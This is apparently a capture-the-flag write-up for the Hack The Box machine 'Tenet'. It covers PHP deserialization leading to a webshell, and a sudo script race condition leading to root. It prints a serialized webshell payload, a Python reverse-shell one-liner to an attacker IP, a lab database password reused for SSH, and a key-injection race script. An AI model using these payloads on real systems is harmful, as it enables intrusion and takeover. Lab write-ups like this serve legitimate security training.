---
layout: post
title: "Tenet "
lang: en
categories:
  - writeups
tags:
  - security
  - writeups
  - htb
  - eop
  - linux
  - web
  - php
  - deserialization
  - sudo
  - race-condition
date: 2021/06/14 22:27:00
thumbnail: /img/HackTheBox/tenet.png

toc: true
---
# Information



- **Name:** Tenet
- **Profile:** [www.hackthebox.eu](https://app.hackthebox.eu/machines/309)
- **Difficulty:** Medium
- **OS:** Linux
- **Points:** 30

![Tenet](/img/HackTheBox/tenet.png)



## Overview

Install tools used in this WU on BlackArch Linux:

```
$ sudo pacman -S nmap wpscan bfac
```

## Network enumeration

Port and service scan with nmap:

```
# Nmap 7.91 scan initiated Sun May  2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds
```

## Web enumeration

As we are facing a Wordpress we can launch a vulnerability scan + user enumeration
with wpscan:

```
$ wpscan --url http://tenet.htb -e u
```

The two vulnerabilities found are authenticated so we can't exploit them.
Two users are found: `neil`, `protagonist`.

It's possible to try to bruteforce the password for those two users but it's not very efficient:

```
$ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt
```

I tried to find any vhost but without success:

```
$ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:NORAJ -H 'Host: NORAJ.tenet.htb' -fs 10918
```

There is an interesting comment on wordpress:

> did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

A post is also giving another hint:

> We're looking for beta testers of our new time-management software, 'Rotas'
>
> 'Rotas' will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!
>
> For more information regarding opting-in, watch this space.

So I tried to find some backup files with ffuf and bfac but I only got some false positives.

```
$ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
...

.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

$ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
...

.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

$ bfac -u http://tenet.htb/sator
$ bfac -u http://tenet.htb/rotas
```

While you don't find there is a file sator.php hosted on tenet.htb you have to
guess it's served with the IP address http://10.10.10.223/sator.php (default fallback vhost probably).

```
[+] Grabbing users from text file
[] Database updated
```

We can find the backup file with bfac:

```
$ bfac -u http://10.10.10.223/sator.php
...
[i] URL: http://10.10.10.223/sator.php
[$] Discovered: -> {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514)

[i] Findings:
http://10.10.10.223/sator.php.bak (200) | (Content-Length: 514)
```

## Web exploitation

`sator.php.bak`

```php
<?php

class DatabaseExport
{
  public $user_file = 'users.txt';
  public $data = '';

  public function update_db()
  {
    echo '[+] Grabbing users from text file <br>';
    $this-> data = 'Success';
  }


  public function __destruct()
  {
    file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
    echo '[] Database updated <br>';
  //	echo 'Gotta get this working properly...';
  }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

There is a PHP deserialization here that allow us to upload any arbitrary content.

We can even find a [similar case](https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work) on security stackexchange.

My PoC to generate the serialized webshell payload:

```php
<?php

class DatabaseExport
{
  public $user_file = 'noraj.php';
  public $data = '<?php system($_GET["cmd"])?>';
}

$klass = new DatabaseExport();

$payload = serialize($klass);

echo $payload;
```

Here the URL-encoded form:

http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22noraj.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}

Then we can access teh webshell and execute a command: http://10.10.10.223/noraj.php?cmd=id

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We know the upload and command exec works so let's execute a reverse shell:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.44",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We receive it on our reverse shell:

```
$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
id
INFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP)
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`cat /etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
```

## Shell upgrade

`/var/www/html/wordpress`

```php
...
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
```

We can re-use DB password over SSH: `ssh neil@tenet.htb`.

## Privilege Escalation of Machine : from neil to root

```
$ sudo -l
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

A script can be run as root via sudo: `/usr/local/bin/enableSSH.sh`

```bash
#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"
                if [[ -f $1 ]]; then /bin/rm $1; fi
                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

Since `mktemp` will create a random file we need to make a race condition
to write our SSH pub key into it.

```bash
#!/bin/bash

key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n noraj@penarch'

while true
do
    echo $key | tee /tmp/ssh-* > /dev/null
done
```

We execute that while running `sudo /usr/local/bin/enableSSH.sh`.
Several tries may be necessary because race conditions doesn't always work the 1st time.

Then we can connect as root.

`ssh root@tenet.htb -i ~/.ssh/id_ed25519`

